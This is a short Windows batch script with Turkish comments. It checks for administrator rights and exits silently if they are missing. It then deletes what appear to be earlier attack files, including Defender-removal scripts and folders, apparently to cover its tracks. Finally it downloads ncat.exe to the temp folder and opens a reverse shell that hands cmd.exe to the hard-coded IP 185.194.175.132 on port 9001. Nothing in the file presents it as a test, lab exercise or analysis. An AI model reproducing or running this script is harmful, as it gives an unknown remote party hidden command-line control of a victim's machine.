@echo off

:: Yonetici yetkisi kontrolu
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    exit
)

where ncat.exe >nul 2>&1
if %errorlevel%==0 (
    del /f /q s.bat
    del /f /q a.py
    del /f /q asd.bat
    del /f /q ddd.vbs
    del /f /q expe2.bat
    del /f /q expe2.vbs
    del /f /q lalala.vbs
    del /f /q a.ps1
    del /f /q RunDefenderRemover.vbs
    del /f /q DefenderRemover.bat

    rmdir /s /q Remove_SecurityComp
    rmdir /s /q Remove_Defender

    cd %temp%
    curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
    ncat.exe 185.194.175.132 9001 -e cmd.exe
) else (
    exit
)
